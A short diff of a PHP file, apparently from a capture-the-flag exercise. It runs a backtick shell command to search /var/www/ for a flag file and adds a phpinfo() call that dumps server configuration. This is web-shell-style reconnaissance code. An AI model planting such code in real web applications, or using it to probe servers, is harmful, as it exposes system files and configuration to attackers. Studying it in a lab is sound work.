@@ -6,4 +6,5 @@ echo $p;
 echo '<br/>';
 echo `find /var/www/ -name flag`;
 echo '${whoami}';
+echo phpinfo();
 ?>
